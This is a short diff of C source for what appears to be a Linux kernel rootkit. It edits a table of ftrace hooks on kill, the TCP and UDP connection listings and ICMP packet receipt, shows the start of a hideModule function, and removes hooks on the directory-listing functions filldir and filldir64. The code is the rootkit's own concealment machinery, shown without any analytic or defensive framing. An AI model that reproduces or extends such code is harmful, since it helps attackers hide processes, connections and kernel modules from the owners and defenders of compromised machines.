@@ -2,7 +2,6 @@
 #include "hooks/kill.h"
 #include "hooks/tcpX_seq_show.h"
 #include "hooks/udpX_seq_show.h"
-#include "hooks/filldir.h"
 #include "hooks/icmp_rcv.h"
 
 #ifdef __x86_64__
@@ -17,9 +16,7 @@ static struct ftrace_hook hooks[] = {
     HOOK("tcp6_seq_show", tcp6_seq_show_hook, &original_tcp6_seq_show),
     HOOK("udp4_seq_show", udp4_seq_show_hook, &original_udp4_seq_show),
     HOOK("udp6_seq_show", udp6_seq_show_hook, &original_udp6_seq_show),
-    HOOK("icmp_rcv", icmp_rcv_hook, &original_icmp_rcv),
-    HOOK("filldir", filldir_hook, &original_filldir),
-    HOOK("filldir64", filldir_hook, &original_filldir)
+    HOOK("icmp_rcv", icmp_rcv_hook, &original_icmp_rcv)
 };
 
 void hideModule(void) {
